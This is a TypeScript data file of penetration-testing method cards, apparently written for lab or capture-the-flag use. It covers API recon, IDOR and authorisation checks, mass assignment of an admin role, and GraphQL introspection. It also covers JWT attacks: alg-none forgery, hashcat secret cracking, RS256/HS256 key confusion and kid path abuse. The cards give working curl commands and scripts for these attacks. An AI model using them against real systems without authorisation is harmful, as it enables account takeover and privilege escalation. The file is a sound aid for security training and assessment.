import type { Technique } from "./methodology";

export const API_TECHNIQUES: Technique[] = [
  {
    id: "web-api-door",
    section: "Web",
    title: "This site is an API",
    look: "The body is JSON, the cookie has two dots, or a script calls /api. Directory brute on HTML will not show the authorisation bug. Switch sections.",
    cmd: `curl -sI http://<ip>/
curl -s http://<ip>/ | head -c 400
# in the page source or a JS file
grep -oE '/api/[A-Za-z0-9_./?-]+' app.js | sort -u`,
    alive: "Content-Type: application/json, a Bearer token, or a path starting with /api.",
    dead: "HTML, a normal login form, and no /api in the scripts. Stay on the Web cards.",
    next: "Open the API section. The first card is the spec. Do not start a second wordlist.",
  },
  {
    id: "api-find",
    section: "API",
    title: "API 1 — find the spec",
    look: "A spec is the site map. Swagger, OpenAPI, and the JS bundle name the routes, the verbs, and which ones want a token. Guessing paths is the time sink.",
    cmd: `for p in swagger swagger/index.html swagger.json openapi.json api-docs v2/api-docs v3/api-docs .well-known/openid-configuration; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://<ip>/$p")
  echo "$code /$p"
done
curl -s http://<ip>/static/app.js | grep -oE '/api/[A-Za-z0-9_./?-]+' | sort -u`,
    alive: "200 and a paths object, a Swagger UI, or a short list of /api routes from the script.",
    dead: "404 on every doc path and the script has no /api. There may still be one endpoint linked from the page. There is not a hidden API to brute.",
    next: "Read the paths. Note which ones say security or bearer. Those are the requests you replay. A spec with forty routes is not forty bugs.",
  },
  {
    id: "api-unauth",
    section: "API",
    title: "API 2 — no token, then the wrong user",
    look: "The same request three ways. Yours, with the header removed, and with your token against one other id. You are checking whether the server decides, not whether the JSON parses.",
    cmd: `# the request you already captured. Then the same URL with no Authorization and no Cookie.
curl -s http://<ip>/api/me -H 'Authorization: Bearer <token>'
curl -s http://<ip>/api/me
# one other id. Not a loop.
curl -s http://<ip>/api/users/15 -H 'Authorization: Bearer <token>'
curl -s http://<ip>/api/users/14 -H 'Authorization: Bearer <token>'
# one admin path, your token
curl -s http://<ip>/api/admin -H 'Authorization: Bearer <token>'`,
    alive: "The no-token request still returns your object, user 14's object comes back, or /api/admin answers 200 to your user.",
    dead: "401 with no token, 403 on the other id, 403 on /api/admin. Authorisation is checked. The IDOR card is the same idea for a file id. Do not walk every integer.",
    next: "A field you were not meant to see is a password or a role. Use it once. Then JWT, if the token is three base64 parts.",
  },
  {
    id: "api-verbs",
    section: "API",
    title: "API 3 — verb and one extra field",
    look: "GET worked. The bug is often PUT, PATCH, or DELETE on that same object, or one field the response already showed you and the update ignored. This is not a parameter fuzzer.",
    cmd: `curl -s -D - -o /dev/null -X OPTIONS http://<ip>/api/users/15
# one write. Change a field you are allowed to change, and add one you are not.
curl -s -X PATCH http://<ip>/api/users/15 \\
  -H 'Authorization: Bearer <token>' \\
  -H 'Content-Type: application/json' \\
  -d '{"displayName":"me","role":"admin"}'
curl -s http://<ip>/api/users/15 -H 'Authorization: Bearer <token>'`,
    alive: "OPTIONS lists PUT or PATCH, and the next GET shows role admin. Or DELETE removed an object you do not own.",
    dead: "The extra field is ignored, the verb is 405, and your display name is the only change. Mass assignment is not the bug. Do not send isAdmin, admin, and role in twenty spellings.",
    next: "If a v2 path appeared in the spec or the JS, request that one path. A 404 ends it.",
  },
  {
    id: "api-graphql",
    section: "API",
    title: "API 4 — GraphQL, one query",
    look: "A /graphql path or a POST that takes a query string. Introspection either names the schema or it is off. It does not get its own hour.",
    cmd: `curl -s http://<ip>/graphql \\
  -H 'Content-Type: application/json' \\
  -d '{"query":"{__schema{queryType{name}}}"}'`,
    alive: "JSON with a type name, not an HTML error page.",
    dead: "404, or introspection is disabled. Stop. Do not start a GraphQL wordlist.",
    next: "Read the one type the app actually uses. If a field is a user id, that is API 2 again.",
  },
  {
    id: "jwt-read",
    section: "API",
    title: "JWT 1 — read it",
    look: "Three parts separated by dots. The first two are base64url JSON. The third is the signature. A decoded payload is not access. It is the list of claims the server might be trusting.",
    cmd: `python3 - << 'PY'
import base64, json
token = "<token>"
header, payload, sig = token.split(".")
def show(part):
    part += "=" * ((4 - len(part) % 4) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
show(header)
show(payload)
print("signature bytes", len(sig))
PY`,
    alive: "alg, and a claim you recognise: sub, user, role, or exp.",
    dead: "The cookie has no dots, or only one. It is an opaque session. Do not hashcat it. Do not call it a JWT.",
    next: "Paste it in the reader on this page. HS256 goes to JWT 3. RS256 or ES256 goes to JWT 4. none goes to JWT 2, and that card is one request.",
  },
  {
    id: "jwt-trust",
    section: "API",
    title: "JWT 2 — is the signature checked",
    look: "Two tests, then stop. First send the same token with the payload edited and the old signature left in place. That must fail. Then one token whose header says none and whose signature is empty. A third spelling of none is not a new test.",
    cmd: `# 1. Flip one letter inside the payload. Keep header and signature.
#    401 means the signature is checked. Continue only to test 2.
# 2. alg none, original payload, empty signature. One request.
python3 - << 'PY'
import base64, json
token = "<token>"
_, payload, _ = token.split(".")
def b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
print(b64({"alg": "none", "typ": "JWT"}) + "." + payload + ".")
PY
curl -s -o /dev/null -w '%{http_code}\\n' http://<ip>/api/me -H 'Authorization: Bearer <printed>'`,
    alive: "Test 2 returns 200. The server accepted alg none. You are the user in that payload. Change one claim only if the unchanged token was already accepted.",
    dead: "401 or 403. The signature is required. none, None, and nOnE are the same dead test. Stop this card.",
    next: "If alg was HS256, JWT 3. If it was RS256, JWT 4. Do not stay on none.",
  },
  {
    id: "jwt-hmac",
    section: "API",
    title: "JWT 3 — HMAC secret",
    look: "alg is HS256, HS384, or HS512. The secret is a password. A short list from the lab comes first: the product name, secret, password, the host name. rockyou is the time sink unless this token is the only lead left.",
    cmd: `echo '<token>' > jwt.txt
printf '%s\\n' secret password admin <product> jwtkey > words.txt
hashcat -a 0 -m 16500 jwt.txt words.txt
hashcat -m 16500 jwt.txt --show`,
    alive: "Status Cracked, and --show prints the secret. You can sign a token the server will accept.",
    dead: "Exhausted on the short list, or Token length exception because the line was not the original three-part token. RS256 in the header means this card is the wrong one. hashcat cannot crack a private key.",
    next: "Sign the original payload plus one claim, with that secret, HS256. A 200 is the bug. If the short list is exhausted and you still have other hosts, leave rockyou for later.",
  },
  {
    id: "jwt-rs",
    section: "API",
    title: "JWT 4 — RS256 and JWKS",
    look: "alg is RS256, RS384, RS512, or ES256. There is a private key you do not have. Cracking it is the waste. The only related check is whether the public key was published, and whether the server will treat that public key as an HMAC secret. One request.",
    cmd: `curl -s http://<ip>/.well-known/jwks.json
curl -s http://<ip>/.well-known/openid-configuration
# confusion, only if that JSON gave you the public key:
# sign the same payload as HS256, using the public key PEM as the HMAC secret.
# one Authorization header.
# 401 and you stop.`,
    alive: "That one HS256 token, signed with the public key, returns 200 and a claim you changed.",
    dead: "401. Or no JWKS. Do not run hashcat. Do not try a second key, a second alg, or a file of public keys.",
    next: "Back to API 2. The token is doing its job. The id in the URL may not be.",
  },
  {
    id: "jwt-kid",
    section: "API",
    title: "JWT 5 — exp, role, kid",
    look: "Three claims that look like bugs and usually are not. exp in the past, a role you wish you had, and kid. Each one gets a single request.",
    cmd: `# exp: send the original token after exp. 401 means expiry is enforced.
# role: the payload is not a form. Editing role without a valid signature is JWT 2, and it already failed if you are here.
# kid: a short name (1, prod, app-key) is normal. A path is the one extra test.
# Sign HS256 with an empty secret only when kid looks like a file path. Point kid at a file whose bytes you know.
# 401 means kid is not the bug.`,
    alive: "The API still returns 200 after exp, or the empty-secret token is accepted when kid names a file you can read.",
    dead: "401 on the expired token. kid is a key id, not a path. role in the JSON did nothing because the signature failed. Stop.",
    next: "You are out of JWT. Go back to the spec and API 2. Another id is more common than a broken signature.",
  },
];
